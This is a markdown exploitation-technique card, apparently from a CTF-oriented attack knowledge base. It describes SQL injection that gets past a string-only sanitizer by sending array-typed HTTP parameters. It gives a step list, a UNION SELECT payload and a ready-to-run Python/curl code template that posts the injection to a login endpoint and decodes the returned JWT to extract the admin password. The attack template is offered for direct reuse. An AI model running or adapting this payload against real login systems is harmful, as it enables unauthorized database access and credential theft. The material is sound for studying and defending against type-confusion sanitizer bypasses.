---
name: param_array_type_confusion_sqli
vuln_type: sqli
sub_technique: type_confusion
category: exploitation
safety_level: safe
---

# Http Parameter Array Type Confusion — Bypass String-Only Sanitization For Sql Injection

## When to Apply

A custom web server or framework parses HTTP POST parameters and supports array syntax like `param[0]=value`, creating a different internal type (ARRAY) vs the normal STRING type. A sanitization function (e.g., replaceString) checks if all arguments are STRING type before performing replacements. If ANY argument is not STRING, the function returns the unsanitized value. Attackers send `password[0]=SQLi` to create an ARRAY-typed value that bypasses the type check, allowing single-quote injection into SQL queries.

## Prerequisites

- Server parses param[idx]=value as ARRAY type distinct from STRING
- Sanitization function type-checks args and skips processing for non-STRING types
- SQL queries are built via string interpolation/formatting with the unsanitized value
- ARRAY type's getStringValue() returns the raw string content preserving special chars

## Steps

1. Identify parameter parsing: test `param[0]=value` vs `param=value` behavior
2. Locate sanitization: replaceString(input, "'", "") or similar SQL escaping
3. Confirm type-checking in sanitization: if arg type != STRING, return unsanitized
4. Send payload with array syntax: `password[0]=x' UNION SELECT secret FROM table-- -`
5. The ARRAY-typed value bypasses replaceString type check
6. formatString/query builder calls getStringValue() on the ARRAY, getting raw SQL payload
7. UNION SELECT extracts target data (admin password, flag, etc.)
8. Exfiltrated data appears in JWT token payload, response body, or error message

## Code Template

```
import subprocess, base64, json, sys\nurl = sys.argv[1]\n# Array syntax password[0] creates ARRAY type, bypassing replaceString\npayload = \"asdf' union select password from user where username='admin'-- -\"\nr = subprocess.check_output([\n    'curl', f'{url}/login', '-X', 'POST', '-d',\n    f'username=a&password[0]={payload}'\n])\n# Extract JWT token from Set-Cookie or response body\ntoken = r[r.find(b'token=')+6:r.find(b\"';\")].decode()\npayload_b64 = token.split('.')[1]\nprint(json.loads(base64.b64decode(payload_b64 + '==')))
```

## Examples

### Example 1

- **server**: Custom C++ HTTP server with custom .cg template language
- **array_syntax**: password[0]=value → ArrayValue (type=ARRAY)
- **sanitizer**: replaceString(v1, v2, v3) checks all args for STRING type
- **sanitizer_bypass**: ARRAY type for v1 → type check fails → v1 returned raw
- **sqli_sink**: formatString('SELECT username FROM USER WHERE password=%', password)
- **exfil**: UNION SELECT extracts admin password (=flag) into JWT username field

The C++ replaceString checks `v1->getType() != ValueType::STRING` and returns v1 unchanged. Array param syntax `password[0]=...` creates ValueType::ARRAY. formatString uses getStringValue() which works for any type, preserving the raw SQL injection payload. The flag is stored as the admin user's password in SQLite.
